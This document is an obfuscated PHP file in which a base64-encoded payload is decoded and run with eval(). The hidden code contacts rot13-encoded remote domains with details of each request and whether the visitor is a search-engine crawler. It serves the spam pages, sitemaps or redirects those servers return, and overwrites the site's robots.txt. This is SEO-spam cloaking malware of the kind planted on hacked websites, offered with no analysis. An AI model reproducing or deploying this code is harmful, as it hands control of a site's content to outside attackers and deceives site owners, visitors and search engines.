
$a=base64_decode('CiR4bWxuYW1lID1bIiUzNiUzNyUzOCUyRCU2OCU3NiUzMCUzMCUzNSUyRSU3MCU2MiU2MSU2OSU2MiU3OSU2OCU2NyU2QyUyRSU2QiU2QyU2RCIsIiUzNiUzNyUzOCUyRCU2OCU3NiUzMCUzMCUzNSUyRSU3MiU2MyU3NSU3MiU3QSU3MiU3NiU2QiUyRSU2NyU2MiU2MyIsIiUzNiUzNyUzOCUyRCU2OCU3NiUzMCUzMCUzNSUyRSU2NCU2OCU2RSU2MSU2NyU2OCU2RSU2NyU2NyUyRSU2QiU2QyU2RCIsIiUzNiUzNyUzOCUyRCU2OCU3NiUzMCUzMCUzNSUyRSU2NyU3MiU3MCU3NSU2MSU3MiU2QiU2MyUyRSU2NyU2MiU2MyJdOwokaHR0cF93ZWIgPSAnaHR0cCc7CiRob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokbGFuZyA9IGlzc2V0KCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSA/ICRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddIDogJ2VuJzsKJHVybHNoYW5nID0gJyc7CmlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7CgkkdXJsc2hhbmcgPSAkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107Cn0KJGh0dHAgPSBpc19odHRwcygpID8gJ2h0dHBzJyA6ICdodHRwJzsKJHNwaWRlciA9IGlzX2JvdCgpOwokcmVxdWVzdFVyaSA9IGRyZXF1ZXN0X3VyaSgpOwokdXJsc2hhbmc9aXNfZnJvbV9zZWFyY2hfZW5naW5lKCR1cmxzaGFuZyk7CiRyb2JvdHMgPSAncm9ib3RzLnR4dCc7CiRzdHJpbmcgPSAnNjc4LXVpMDA1JzsKJGlzdGVzdCA9IGZhbHNlOwppZiAoc3RycG9zKCRyZXF1ZXN0VXJpLCAkc3RyaW5nKSAhPT0gZmFsc2UpIHsKCSRpc3Rlc3QgPSB0cnVlOwp9IGVsc2UgewoJJHN0cmluZyA9ICcnOwp9CmlmIChzdHJwb3MoJHJlcXVlc3RVcmksICRyb2JvdHMpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHJlcXVlc3RVcmksICc/cm9ib3RzLnR4dCcpICE9PSBmYWxzZSkgewoJJHJvYm90cyA9ICcxJzsKfWVsc2V7CiAgICAkcm9ib3RzID0gJzAnOwp9CmlmKCR1cmxzaGFuZyl7CgkkdXJsc2hhbmc9JzEnOwp9IGVsc2UgewogICAgJHVybHNoYW5nID0gJzAnOwp9CmNyZWF0ZV9yb2JvdHMoJGh0dHAgLiAnOi8vJyAuICRob3N0KTsKJHBhcmFtID0gaHR0cF9idWlsZF9xdWVyeShbJ2hvc3QnID0+ICRob3N0LCdzcGlkZXInID0+ICRzcGlkZXIsJ3JlcXVlc3RVcmknID0+ICRyZXF1ZXN0VXJpLCd1cmxzaGFuZycgPT4gJHVybHNoYW5nLCdodHRwJyA9PiAkaHR0cCwnbGFuZycgPT4gJGxhbmcsJ3N0cmluZycgPT4gJHN0cmluZywKJ3JvYm90cycgPT4gJHJvYm90cwpdKTsKJGh0bWxfY29udGVudCA9IHJlcXVlc3RzKCR4bWxuYW1lLCAkaHR0cF93ZWIsICRwYXJhbSk7CgppZiAoIXN0cnN0cigkaHRtbF9jb250ZW50LCAnbm9ib3R1c2VyYWdlbnQnKSkgewoJaWYgKHN0cnN0cigkaHRtbF9jb250ZW50LCAnb2todG1sJykpIHsKCQlAaGVhZGVyKCdDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwoJCSRodG1sX2NvbnRlbnQgPSBzdHJfcmVwbGFjZSgnb2todG1sJywgJycsICRodG1sX2NvbnRlbnQpOwoJCWlmICgkaXN0ZXN0KSB7CgkJCWVjaG8gJHN0cmluZzsKCQl9CgkJZWNobyAkaHRtbF9jb250ZW50OwoJCWV4aXQoKTsKCX0gZWxzZSBpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdnZXRjb250ZW50NTAwcGFnZScpKSB7CgkJQGhlYWRlcignSFRUUC8xLjEgNTAwIEludGVybmFsIFNlcnZlciBFcnJvcicpOwoJCWV4aXQoKTsKCX0gZWxzZSBpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICc0MDRwYWdlJykpIHsKCQlAaGVhZGVyKCdIVFRQLzEuMSA0MDQgTm90IEZvdW5kJyk7CgkJZXhpdCgpOwoJfSBlbHNlIGlmIChzdHJzdHIoJGh0bWxfY29udGVudCwgJzMwMXBhZ2UnKSkgewoJCUBoZWFkZXIoJ0hUVFAvMS4xIDMwMSBNb3ZlZCBQZXJtYW5lbnRseScpOwoJCSRodG1sX2NvbnRlbnQgPSBzdHJfcmVwbGFjZSgnMzAxcGFnZScsICcnLCAkaHRtbF9jb250ZW50KTsKCQloZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJGh0bWxfY29udGVudCk7CgkJZXhpdCgpOwoJfSBlbHNlIGlmIChzdHJzdHIoJGh0bWxfY29udGVudCwgJ29reG1sJykpIHsJCgkJJGh0bWxfY29udGVudCA9IHN0cl9yZXBsYWNlKCdva3htbCcsICcnLCAkaHRtbF9jb250ZW50KTsKCQlAaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3htbDsgY2hhcnNldD11dGYtOCcpOwoJCWVjaG8gJGh0bWxfY29udGVudDsKCQlleGl0KCk7Cgl9IGVsc2UgaWYgKHN0cnN0cigkaHRtbF9jb250ZW50LCAnb2tyb2JvdHMnKSkgewoJCSRodG1sX2NvbnRlbnQgPSBzdHJfcmVwbGFjZSgnb2tyb2JvdHMnLCAnJywgJGh0bWxfY29udGVudCk7CgkJQGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluOyBjaGFyc2V0PXV0Zi04Jyk7CgkJZWNobyAkaHRtbF9jb250ZW50OwoJCWV4aXQoKTsKCX0KfQoKZnVuY3Rpb24gcmVxdWVzdHMoJHhtbG5hbWUsICRodHRwX3dlYiwgJHBhcmFtKQp7CglzaHVmZmxlKCR4bWxuYW1lKTsKCWZvcmVhY2ggKCR4bWxuYW1lIGFzICRkb21haW4pIHsKCQkkZG9tYWluID0gc3RyX3JvdDEzKHVybGRlY29kZSgkZG9tYWluKSk7CgkJJHVybCA9ICRodHRwX3dlYiAuICc6Ly8nIC4gJGRvbWFpbiAuICcvPycgLiAkcGFyYW07CgkJJGNoID0gY3VybF9pbml0KCk7CgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKCQkkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsKCQlpZiAoIWN1cmxfZXJybm8oJGNoKSkgewoJCQljdXJsX2Nsb3NlKCRjaCk7CgkJCXJldHVybiAkcmVzcG9uc2U7CgkJfSBlbHNlIHsKCQkJaWYgKHN0cmlzdHIoY3VybF9lcnJvcigkY2gpLCAnNDQzJykpIHsKCQkJCWVjaG8gIjQ0MyI7CgkJCX0KCQkJY3VybF9jbG9zZSgkY2gpOwoJCX0KCX0KCXJldHVybiAnbm9ib3R1c2VyYWdlbnQnOwp9CgoKZnVuY3Rpb24gaXNfYm90KCkKewoJJHVzZXJfYWdlbnQgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSk7CgkkYm90cyA9IFsnZ29vZ2xlYm90JywgJ2JpbmcnLCAneWFob28nLCAnZ29vZ2xlJywgJ0dvb2dsZWJvdCddOwoJZm9yZWFjaCAoJGJvdHMgYXMgJGJvdCkgewoJCWlmIChzdHJwb3MoJHVzZXJfYWdlbnQsICRib3QpICE9PSBmYWxzZSkgewoJCQlyZXR1cm4gMTsKCQl9Cgl9CglyZXR1cm4gMDsKfQoKZnVuY3Rpb24gZHJlcXVlc3RfdXJpKCkKewoJaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSkgewoJCSRkdXJpID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107Cgl9IGVsc2UgewoJCWlmIChpc3NldCgkX1NFUlZFUlsnYXJndiddKSkgewoJCQkkZHVyaSA9ICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz8nIC4gJF9TRVJWRVJbJ2FyZ3YnXVswXTsKCQl9IGVsc2UgewoJCQkkZHVyaSA9ICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz8nIC4gJF9TRVJWRVJbJ1FVRVJZX1NUUklORyddOwoJCX0KCX0KCXJldHVybiAkZHVyaTsKfQoKCmZ1bmN0aW9uIGlzX2Zyb21fc2VhcmNoX2VuZ2luZSgkcmVmZXJlcikKewoJaWYgKGVtcHR5KCRyZWZlcmVyKSkgcmV0dXJuIGZhbHNlOwoKCSRzZWFyY2hFbmdpbmVzID0gWydnb29nbGUuJywgJ2JpbmcuJywgJ3lhaG9vLicsXTsKCglmb3JlYWNoICgkc2VhcmNoRW5naW5lcyBhcyAkZW5naW5lKSB7CgkJaWYgKHN0cmlwb3MoJHJlZmVyZXIsICRlbmdpbmUpICE9PSBmYWxzZSkgewoJCQlyZXR1cm4gdHJ1ZTsKCQl9Cgl9CglyZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIGNyZWF0ZV9yb2JvdHMoJHVybCkKewoJJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gJy9yb2JvdHMudHh0JzsKCSRjb250ZW50ID0gJ1VzZXItYWdlbnQ6IConIC4gUEhQX0VPTDsKCSRjb250ZW50IC49ICdBbGxvdzogLycgLiBQSFBfRU9MIC4gUEhQX0VPTDsKCSRjb250ZW50IC49ICdTaXRlbWFwOiAnIC4gJHVybCAuICcvc2l0ZW1hcC54bWwnIC4gUEhQX0VPTDsKCWlmICghZmlsZV9leGlzdHMoJHBhdGgpKSB7CgkJZmlsZV9wdXRfY29udGVudHMoJHBhdGgsICRjb250ZW50KTsKCX0gZWxzZSB7CgkJJGV4aXN0aW5nQ29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsKCQlpZiAoJGV4aXN0aW5nQ29udGVudCAhPT0gJGNvbnRlbnQpIHsKCQkJZmlsZV9wdXRfY29udGVudHMoJHBhdGgsICRjb250ZW50KTsKCQl9Cgl9Cn0KCmZ1bmN0aW9uIGlzX2h0dHBzKCkKewogICAgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQUyddKSAmJiBzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQUyddKSAhPT0gJ29mZicpIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0gZWxzZWlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddKSAmJiAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddID09PSAnaHR0cHMnKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGVsc2VpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfRlJPTlRfRU5EX0hUVFBTJ10pICYmIHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfRlJPTlRfRU5EX0hUVFBTJ10pICE9PSAnb2ZmJykgewogICAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgcmV0dXJuIGZhbHNlOwp9Cgo=');
eval($a);
